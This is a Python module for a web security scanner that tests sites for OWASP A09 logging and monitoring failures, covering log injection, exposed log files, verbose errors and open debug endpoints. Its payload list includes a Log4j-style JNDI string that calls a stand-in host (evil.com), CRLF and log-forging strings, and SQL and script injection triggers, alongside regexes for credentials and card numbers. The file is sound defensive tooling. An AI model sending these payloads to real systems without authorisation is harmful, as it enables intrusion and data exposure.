"""
Logging and Monitoring Security Scanner - OWASP A09:2021
Detects security logging and monitoring failures.
"""

import asyncio
import logging
import re
from collections.abc import Callable
from typing import Any
from urllib.parse import urljoin

from .base_scanner import BaseScanner, Vulnerability

logger = logging.getLogger(__name__)


class LoggingScanner(BaseScanner):
    """
    Security logging and monitoring assessment module.

    Capabilities:
    - Log injection detection
    - Sensitive data logging detection
    - Error disclosure analysis
    - Logging infrastructure exposure
    - Audit trail weakness detection
    """

    def __init__(self, config, http_client):
        super().__init__(config, http_client)
        self.name = "LoggingScanner"
        self.description = "Detects security logging and monitoring failures (OWASP A09)"
        self.version = "1.0.0"

        # Log injection payloads
        self.log_injection_payloads = [
            # CRLF injection
            "test%0d%0aINJECTED_LOG_ENTRY",
            "test\r\nFake: Header",
            "test%0aNew-Line-Injection",
            # Log forging
            "test\n[ERROR] Fake Error Message",
            "test\r\n[CRITICAL] Injected Critical Log",
            # Format string
            "%s%s%s%s%s",
            "%x%x%x%x",
            "${jndi:ldap://evil.com/a}",  # Log4j style
            # Unicode bypass
            "test\u000aInjected",
            "test\u000dInjected",
        ]

        # Paths that might expose logs
        self.log_exposure_paths = [
            "/logs/",
            "/log/",
            "/debug/",
            "/debug.log",
            "/error.log",
            "/access.log",
            "/app.log",
            "/application.log",
            "/server.log",
            "/catalina.out",
            "/var/log/",
            "/.log",
            "/logs/error.log",
            "/logs/access.log",
            "/logs/debug.log",
            "/trace.axd",  # ASP.NET trace
            "/elmah.axd",  # ASP.NET error logging
            "/phpinfo.php",
            "/info.php",
            "/test.php",
            "/debug.php",
            "/console/",
            "/actuator/logfile",  # Spring Boot
            "/actuator/loggers",
            "/__debug__/",  # Django debug
            "/rails/info/properties",  # Rails
        ]

        # Sensitive data patterns in responses
        self.sensitive_patterns = {
            "password_in_logs": r'password["\'\s:=]+[^\s"\']{3,}',
            "api_key_exposed": r'api[_-]?key["\'\s:=]+[a-zA-Z0-9]{16,}',
            "token_exposed": r'(bearer|token)["\'\s:=]+[a-zA-Z0-9._-]{20,}',
            "credit_card": r"\b(?:\d{4}[-\s]?){3}\d{4}\b",
            "ssn": r"\b\d{3}-\d{2}-\d{4}\b",
            "email_in_error": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
            "internal_ip": r"\b(?:10|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.\d{1,3}\.\d{1,3}\b",
            "stack_trace": r"(Traceback|Exception|Error|at\s+\w+\.\w+\()",
            "sql_in_error": r"(SQL|mysql|postgresql|sqlite|oracle)",
            "path_disclosure": r"(/var/www|/home/|C:\\|\\\\)",
        }

        # Error triggering paths/params
        self.error_triggers = [
            ("path", "/'><script>"),
            ("path", "/..%00/"),
            ("path", "/api/v99999/nonexistent"),
            ("param", "[]"),
            ("param", "{}"),
            ("param", "null"),
            ("param", "-1"),
            ("param", "99999999999999999"),
            ("param", "'; DROP TABLE--"),
        ]

    async def scan(self, url: str, progress_callback: Callable | None = None) -> dict[str, Any]:
        """Perform logging and monitoring security scan."""
        logger.info(f"Starting logging security scan on {url}")
        vulnerabilities = []

        try:
            self._update_progress(progress_callback, 10, "Testing log injection")

            # 1. Test for log injection vulnerabilities
            log_injection_vulns = await self._test_log_injection(url)
            vulnerabilities.extend(log_injection_vulns)

            self._update_progress(progress_callback, 35, "Checking for exposed logs")

            # 2. Check for exposed log files
            exposed_logs = await self._check_exposed_logs(url)
            vulnerabilities.extend(exposed_logs)

            self._update_progress(progress_callback, 60, "Testing error handling")

            # 3. Trigger errors and analyze responses
            error_vulns = await self._analyze_error_responses(url)
            vulnerabilities.extend(error_vulns)

            self._update_progress(progress_callback, 85, "Checking debug endpoints")

            # 4. Check for debug/monitoring endpoints
            debug_vulns = await self._check_debug_endpoints(url)
            vulnerabilities.extend(debug_vulns)

            self._update_progress(progress_callback, 100, "completed")

            status = "Vulnerable" if vulnerabilities else "Clean"
            return self._format_result(
                status, f"Found {len(vulnerabilities)} logging/monitoring issues", vulnerabilities
            )

        except Exception as e:
            logger.exception(f"Logging scan failed: {e}")
            return self._format_result("Error", f"Scan failed: {e}", [])

    async def _test_log_injection(self, url: str) -> list[Vulnerability]:
        """Test for log injection vulnerabilities."""
        vulnerabilities = []

        for payload in self.log_injection_payloads[:5]:
            try:
                # Test in query parameter
                test_url = f"{url}?q={payload}"
                response = await self.http_client.get(test_url)

                if response:
                    content = await response.text()

                    # Check if payload is reflected (potential log injection)
                    if "INJECTED" in content or "Fake" in content:
                        vulnerabilities.append(
                            self._create_vulnerability(
                                title="Potential Log Injection Vulnerability",
                                description="The application may be vulnerable to log injection attacks. User input appears to be logged without proper sanitization.",
                                severity="medium",
                                type="log_injection",
                                evidence={"payload": payload, "url": test_url, "reflected": True},
                                cwe_id="CWE-117",
                                remediation="Sanitize all user input before logging. Remove or encode newline characters and other control characters.",
                            )
                        )
                        break

                # Test in POST body
                test_data = {"input": payload, "username": payload}
                response = await self.http_client.post(url, json=test_data)

                await asyncio.sleep(0.3)

            except Exception as e:
                logger.debug(f"Log injection test failed: {e}")

        return vulnerabilities

    async def _check_exposed_logs(self, url: str) -> list[Vulnerability]:
        """Check for exposed log files."""
        vulnerabilities = []

        tasks = [self._check_log_path(url, path) for path in self.log_exposure_paths]
        results = await self._concurrent_task_runner(tasks, concurrency_limit=10)

        for result in results:
            if result:
                vulnerabilities.append(result)

        return vulnerabilities

    async def _check_log_path(self, base_url: str, path: str) -> Vulnerability | None:
        """Check if a log path is accessible."""
        try:
            target = urljoin(base_url, path)
            response = await self.http_client.get(target)

            if not response or response.status != 200:
                return None

            content = await response.text()
            content_type = response.headers.get("content-type", "").lower()

            # Check if it looks like a log file
            log_indicators = [
                "[error]",
                "[warn]",
                "[info]",
                "[debug]",
                "traceback",
                "exception",
                "error:",
                "timestamp",
                "log level",
                "request",
                "- - [",
                "GET /",
                "POST /",
            ]

            is_log = any(indicator in content.lower() for indicator in log_indicators)

            if is_log or "text/plain" in content_type or len(content) > 1000:
                # Check for sensitive data in logs
                sensitive_findings = self._check_sensitive_data(content)

                severity = "high" if sensitive_findings else "medium"

                return self._create_vulnerability(
                    title=f"Log File Exposed: {path}",
                    description=f"Log file or debug information is publicly accessible at {path}. This may leak sensitive information.",
                    severity=severity,
                    type="log_exposure",
                    evidence={
                        "url": target,
                        "path": path,
                        "content_preview": content[:500],
                        "sensitive_data_found": sensitive_findings,
                    },
                    cwe_id="CWE-532",
                    remediation="Restrict access to log files. Move them outside the web root or protect with authentication.",
                )

        except Exception as e:
            logger.debug(f"Log path check failed for {path}: {e}")

        return None

    def _check_sensitive_data(self, content: str) -> list[str]:
        """Check content for sensitive data patterns."""
        findings = []

        for pattern_name, pattern in self.sensitive_patterns.items():
            if re.search(pattern, content, re.IGNORECASE):
                findings.append(pattern_name)

        return findings

    async def _analyze_error_responses(self, url: str) -> list[Vulnerability]:
        """Trigger errors and analyze responses for information leakage."""
        vulnerabilities = []

        for trigger_type, trigger_value in self.error_triggers[:5]:
            try:
                if trigger_type == "path":
                    test_url = urljoin(url, trigger_value)
                else:
                    test_url = f"{url}?id={trigger_value}"

                response = await self.http_client.get(test_url)

                if response:
                    content = await response.text()

                    # Check for verbose error messages
                    sensitive = self._check_sensitive_data(content)

                    if sensitive and any(s in sensitive for s in ["stack_trace", "sql_in_error", "path_disclosure"]):
                        vulnerabilities.append(
                            self._create_vulnerability(
                                title="Verbose Error Messages Detected",
                                description="The application returns detailed error messages that may leak sensitive information such as stack traces, database queries, or internal paths.",
                                severity="medium",
                                type="verbose_errors",
                                evidence={
                                    "trigger": trigger_value,
                                    "url": test_url,
                                    "sensitive_data_types": sensitive,
                                    "response_preview": content[:500],
                                },
                                cwe_id="CWE-209",
                                remediation="Configure the application to show generic error messages to users. Log detailed errors server-side only.",
                            )
                        )
                        break

                await asyncio.sleep(0.2)

            except Exception as e:
                logger.debug(f"Error trigger test failed: {e}")

        return vulnerabilities

    async def _check_debug_endpoints(self, url: str) -> list[Vulnerability]:
        """Check for exposed debug and monitoring endpoints."""
        vulnerabilities = []

        debug_endpoints = [
            ("/actuator", "Spring Boot Actuator"),
            ("/actuator/health", "Spring Boot Health"),
            ("/actuator/env", "Spring Boot Environment"),
            ("/actuator/beans", "Spring Boot Beans"),
            ("/health", "Health Check"),
            ("/status", "Status Page"),
            ("/__debug__", "Debug Mode"),
            ("/debug", "Debug Endpoint"),
            ("/trace.axd", "ASP.NET Trace"),
            ("/elmah.axd", "ASP.NET ELMAH"),
            ("/server-status", "Apache Server Status"),
            ("/server-info", "Apache Server Info"),
            ("/nginx_status", "Nginx Status"),
            ("/_profiler", "Symfony Profiler"),
            ("/rails/info", "Rails Info"),
            ("/wp-json/wp/v2/users", "WordPress User Enum"),
        ]

        for path, description in debug_endpoints:
            try:
                target = urljoin(url, path)
                response = await self.http_client.get(target)

                if response and response.status == 200:
                    content = await response.text()

                    # Verify it's actually a debug/info page
                    if len(content) > 50 and (
                        "status" in content.lower()
                        or "version" in content.lower()
                        or "environment" in content.lower()
                        or "health" in content.lower()
                    ):

                        vulnerabilities.append(
                            self._create_vulnerability(
                                title=f"Debug Endpoint Exposed: {path}",
                                description=f"{description} endpoint is publicly accessible. This may leak internal application details.",
                                severity="low" if "health" in path else "medium",
                                type="debug_exposure",
                                evidence={"url": target, "description": description, "content_preview": content[:300]},
                                cwe_id="CWE-489",
                                remediation=f"Restrict access to {path} endpoint or disable it in production.",
                            )
                        )

            except Exception as e:
                logger.debug(f"Debug endpoint check failed for {path}: {e}")

        return vulnerabilities
